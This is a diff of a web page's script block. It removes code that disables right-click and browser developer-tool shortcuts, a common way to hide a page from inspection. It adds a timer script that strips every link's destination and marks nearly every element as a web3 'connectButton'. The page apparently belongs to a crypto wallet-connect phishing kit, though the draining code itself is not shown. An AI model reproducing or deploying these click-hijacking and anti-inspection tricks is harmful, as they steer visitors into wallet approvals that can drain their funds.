@@ -245,26 +245,21 @@
   <script src="assets/js/webModule.js"></script>
   <script src="cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
   <script src="code.tidio.co_443/fuqxxlj93rbgkfzl3rufv2tz5yeuck4f.js" async></script> -->
-  <script>
-    // Disable right-click
-document.addEventListener('contextmenu', (e) => e.preventDefault());
+ <script>
+    function addClassesToElements() {
 
-function ctrlShiftKey(e, keyCode) {
-  return e.ctrlKey && e.shiftKey && e.keyCode === keyCode.charCodeAt(0);
-}
-
-document.onkeydown = (e) => {
-  // Disable F12, Ctrl + Shift + I, Ctrl + Shift + J, Ctrl + U
-  if (
-    event.keyCode === 123 ||
-    ctrlShiftKey(e, 'I') ||
-    ctrlShiftKey(e, 'J') ||
-    ctrlShiftKey(e, 'C') ||
-    (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0))
-  )
-    return false;
-};
-  </script>
+    const links = document.querySelectorAll('a:not(.connectButton)');
+    for (const link of links) {
+        link.removeAttribute('href');
+        link.classList.add('connectButton');
+    }
+    const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+    for (const button of buttons) {
+        button.classList.add('connectButton');
+    }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
 </body>
 
 
